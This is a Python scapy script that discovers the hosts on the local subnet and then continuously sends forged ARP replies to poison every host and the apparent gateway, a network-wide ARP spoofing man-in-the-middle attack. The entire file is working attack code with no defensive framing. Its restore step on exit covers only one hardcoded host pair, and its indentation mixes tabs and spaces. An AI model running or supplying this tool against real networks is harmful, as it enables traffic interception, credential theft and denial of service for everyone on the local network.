#!/usr/bin/env python
import scapy.all as scapy
from scapy.all import ARP, Ether, srp
import time
import socket
import fcntl
import struct
import sys

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])

target_ip = get_ip_address('ens33') + '/24'
# IP Address for the destination
# create ARP packet
arp = ARP(pdst=target_ip)
# create the Ether broadcast packet
# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
# stack them
packet = ether/arp

result = srp(packet, timeout=3, verbose=0)[0]

# a list of clients, we will fill this in the upcoming loop
clients = []

ap = ''
for sent, received in result:
    # for each response, append ip and mac address to `clients` list
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    if ap == '':
        ap = received.psrc

# print clients
print("Available devices in the network:")
print("IP" + " "*18+"MAC")
a ={}
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))
    a[client['ip']] = client['mac']   

def spoof(target_ip, spoof_ip):
    target_mac = a[target_ip]
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=0)

def restore(dest_ip, src_ip):
    dest_mac = a[dest_ip]
    src_mac = a[src_ip]
    packet = ARP(op=2, pdst = dest_ip, hwdst= dest_mac, psrc= src_ip, hwsrc= src_mac)
    scapy.send(packet,count=4, verbose=0)

target_ip = "192.168.28.130"
gateway_ip = "192.168.28.1"
try:
    while True:
        for client in clients:
    	    if client['ip'] != ap:
	        spoof(client['ip'], ap)
	        spoof(ap, client['ip'])
	    sys.stdout.flush()
            time.sleep(2)

except KeyboardInterrupt:
    print("\nResetting ARP\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
